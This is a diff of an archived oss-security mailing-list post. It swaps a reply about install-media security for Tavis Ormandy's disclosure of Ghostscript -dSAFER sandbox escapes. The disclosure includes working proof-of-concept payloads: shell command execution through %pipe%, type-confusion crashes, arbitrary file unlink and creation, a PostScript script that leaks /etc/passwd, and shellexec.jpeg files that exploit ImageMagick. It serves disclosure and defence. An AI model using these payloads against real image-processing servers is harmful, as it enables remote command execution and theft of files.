@@ -1,78 +1,183 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/01/09/5
-Message-ID: <CANO=Ty0aVUpdVJGer0XaoWyKJ97px6sycxms67MpXv2CVO7oDg@mail.gmail.com>
-Date: Tue, 9 Jan 2018 11:33:48 -0700
-From: Kurt Seifried <kseifried@...hat.com>
-To: oss-security <oss-security@...ts.openwall.com>
-Cc: Georgi Guninski <guninski@...inski.com>
-Subject: Re: Own on install. How grave it is?
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/08/21/2
+Message-ID: <CAJ_zFk+ZNi8r8TKTZuaYgSBUz4mxCO7C5SC=B8Ktc_CZQW6Dsw@mail.gmail.com>
+Date: Tue, 21 Aug 2018 05:46:26 -0700
+From: Tavis Ormandy <taviso@...gle.com>
+To: oss-security@...ts.openwall.com
+Subject: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?
 Content-Type: text/plain; charset=utf-8
 
-One thing to keep in mind: most operating systems can have their
-install media updated, e.g. Windows slipstream where you make an
-install media with all available updates, or you can install updates
-without a network trivially (e.g. for RPM/DPKG based systems just have
-a USB key with a copy of the updates and install them). To say nothing
-of using orchestration tools that essentially can take care of it
-themselves, or generating master images that are up to date
-(containers/Docker are a good example here, you want to deploy up to
-date containers and then refresh the entire container for updates, not
-run yum update inside of it, cattle not pets and all that).
+Hello, this was discussed on the distros list, but it was suggested to move
+discussion to oss-security.
 
-Obviously things that don't support this add risk (e.g. you MUST
-connect to the internet to get updates), and if the update tools
-themselves have a problem, you have a major problem.
+You might recall I posted a bunch of -dSAFER sandbox escapes in ghostscript
+a few years ago:
 
+http://seclists.org/oss-sec/2016/q4/29
 
+I found a few file disclosure, shell command execution, memory corruption
+and type confusion bugs. There was also one that was found exploited in the
+wild <http://ghostbutt.com/>. There was also a similar widely exploited
+issue <https://imagetragick.com/> that could be exploited identically.
 
-On Tue, Jan 9, 2018 at 9:46 AM, Simon McVittie <smcv@...ian.org> wrote:
-> On Tue, 09 Jan 2018 at 08:37:08 -0700, Kurt Seifried wrote:
->> Many OS installs/etc take a password during install
->
-> I think Georgi was more concerned about the installation having a secure
-> design, but an insecure (vulnerable) implementation appearing on the
-> installation media due to either unfixed vulnerabilities, or
-> vulnerabilities that were fixed elsewhere but not on the installation
-> media?
->
-> For instance, the Debian installer installs packages from the install
-> media (CD, USB stick, whatever), then immediately updates them
-> from the Internet if possible; but there's a chicken-and-egg
-> problem here, because that update has to be done with whatever
-> version of apt was on the media. If that version happens to suffer
-> from a vulnerability that can be exploited at that time (such as
-> https://security-tracker.debian.org/tracker/CVE-2016-1252 in apt itself,
-> or a vulnerability in the http or signature verification code that it
-> uses) then there's an opportunity for attack.
->
-> The same is true for the kernel and network-device firmware used to boot
-> the installer. Debian mitigates this by releasing updated installation
-> media at every point release (about 1 per 2 months for stable, somewhat
-> slower for oldstable).
->
-> I don't see any way to prevent that class of attack completely. Releasing
-> updated installation media sooner would mitigate it, but preparing
-> installation media is far from being a rapid process.
->
->> On Tue, Jan 9, 2018 at 6:42 AM, Georgi Guninski <guninski@...inski.com> wrote:
->> > Debian jessie (old stable) is vulnerable to malicious mirror attack.
->
-> Assuming you're referring to CVE-2016-1252, whether this is true depends
-> what you mean by jessie. Installs from older media (up to and including
-> 8.6) will be vulnerable to CVE-2016-1252 during the first upgrade run,
-> whereas installs from newer media (8.7 or newer, with the current version
-> being 8.10) are not vulnerable.
->
-> It's true that there was a window (in this case it happens to be 1 month)
-> during which Debian offered an update for CVE-2016-1252, but the newest
-> available installation media still suffered from it.
->
->     smcv
+TL;DR: I *strongly* suggest that distributions start disabling PS, EPS, PDF
+and XPS coders in policy.xml by default.
+
+$ convert input.jpg output.gif
+uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)
+context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+I've found a few more surprising ways to reach ghostscript recently, so
+went back to look again and found a few more.
+
+1. /invalidaccess checks stop working after a failed restore, so you can
+just execute shell commands if you handle the error. Exploitation is very
+trivial. Repro:
+
+$ *gs -q -sDEVICE=ppmraw -dSAFER -sOutputFile=/dev/null*
+GS>*legal*
+GS>*{ null restore } stopped { pop } if*
+GS>*legal*
+GS>*mark /OutputFile (%pipe%id) currentdevice putdeviceprops*
+GS<1>*showpage*
+uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)
+context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+(ImageMagick PoC at end of mail)
+
+2. setcolor claims
+<http://git.ghostscript.com/?p=ghostpdl.git;a=blob;f=psi/zcolor.c;h=4c0f25827e320ceaa9b510c98f9b1926532a26d5;hb=HEAD#l263>
+no
+operand checking is necessary, because it's hidden behind a pseudo-operator
+of the same name. That's true, but you can still call it indirectly via
+setpattern, so type checking is necessary. Repro:
+
+$ *gs -q -sDEVICE=ppmraw -dSAFER*
+GS>*<< /Whatever 16#414141414141 >> setpattern*
+Segmentation fault
+
+3. The LockDistillerParams boolean isn't type checked, so nice easy type
+confusion. Repro:
+
+$ *gs -q -sDEVICE=ppmraw -dSAFER*
+GS>*<< /LockDistillerParams 16#4141414141414141 >> .setdistillerparams*
+Segmentation fault
 
 
+4. .tempfile permissions don't seem to work, I don't know when they broke.
+You're not supposed to be able to open files outside of the patterns in
+the  PermitFileReading array, but that doesn't seem to work for me e.g.:
+$
+*strace -fefile gs -sDEVICE=ppmraw -dSAFER*
+...
+GS>*(/proc/self/cwd/hello) (w) .tempfile*
+open("/proc/self/cwd/hello26E8LQ", O_RDWR|O_CREAT|O_EXCL, 0600) = 3
+GS<2>*dup*
+GS<3>*(hello) writestring*
+GS<2>*closefile*
 
--- 
+This means you can create a file in any directory (I don't think you can
+prevent the random suffix). Additionally, I have a trick to let you read
+and unlink any file you have permission to.
 
-Kurt Seifried -- Red Hat -- Product Security -- Cloud
-PGP A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
-Red Hat Product Security contact: secalert@...hat.com
+Here is how to unlink() any file:
+
+$
+*strace -fefile gs -sDEVICE=ppmraw -dSAFER*
+...
+GS>*{ .bindnow } stopped {} if*
+GS>*(/etc/passwd) [] .tempfile*
+GS<2>*.quit*
+unlink("/etc/passwd")                   = -1 EACCES (Permission denied)
++++ exited with 0 +++
+
+Reading is more complicated, because the best way I know how to do it is to
+interpret a file as as PostScript and catch the syntax errors, here is an
+example:
+
+$ *cat fileread.ps <http://fileread.ps>*
+/FileToSteal (/etc/passwd) def
+errordict /undefinedfilename {
+    FileToSteal % save the undefined name
+} put
+errordict /undefined {
+    (STOLEN: ) print
+    counttomark {
+        ==only
+    } repeat
+    (\n) print
+    FileToSteal
+} put
+errordict /invalidfileaccess {
+    pop
+} put
+errordict /typecheck {
+    pop
+} put
+FileToSteal (w) .tempfile
+statusdict
+begin
+    1 1 .setpagesize
+end
+quit
+$ *gs -q -sDEVICE=ppmraw -dSAFER  fileread.ps <http://fileread.ps>*
+GPL Ghostscript 9.23:
+STOLEN: root:x:0:0:root:
+STOLEN: daemon:x:1:1:daemon:/bash/bin/root:(/etc/passwd)
+STOLEN: bin:x:2:2:bin:/nologin/sbin/usr/sbin:/usr(/etc/passwd)
+STOLEN: sys:x:3:3:sys:/nologin/sbin/usr/bin:(/etc/passwd)
+STOLEN: sync:x:4:65534:sync:/nologin/sbin/usr/dev:(/etc/passwd)
+STOLEN: games:x:5:60:games:/sync/bin/bin:(/etc/passwd)
+
+This can be used to steal arbitrary files from webservers that use
+ImageMagick by encoding file contents into the image output, see my
+previous PoC here <http://www.openwall.com/lists/oss-security/2016/09/29/3> for
+an example. i.e. You can make convert malicious.jpg thumbnail.jpg produce
+an image with the contents of a file visible.
+
+These bugs were found manually, I also wrote a fuzzer and I'm working on
+minimizing a very large number of testcases that I'm planning to report
+over the next few days. I will just file those issues upstream and not post
+each individual one here, you can monitor https://bugs.ghostscript.com/ if
+you want to.  I expect there to be several dozen unique bugs.
+
+In the meantime, I really *strongly* suggest that distributions start
+disabling PS, EPS, PDF and XPS coders in policy.xml by default. I think
+this is the number one "unexpected ghostscript" vector, imho this should
+happen asap. IMHO, -dSAFER is a fragile security boundary at the moment,
+and executing untrusted postscript should be discouraged, at least by
+default.
+
+Please note, ImageMagick sends some initialization commands to ghostscript
+that breaks my minimal PoC, but you can just undo their changes in
+PostScript.
+
+This one works for me on the version in Ubuntu:
+$ *cat shellexec.jpeg*
+%!PS
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%id) currentdevice putdeviceprops
+$ *convert shellexec.jpeg whatever.gif*
+uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)
+context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+For CentOS, try this:
+
+$ *cat shellexec.jpeg*
+%!PS
+userdict /setpagedevice undef
+legal
+{ null restore } stopped { pop } if
+legal
+mark /OutputFile (%pipe%id) currentdevice putdeviceprops
+$ *convert shellexec.jpeg whatever.gif*
+uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)
+context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+Thanks, Tavis.
+
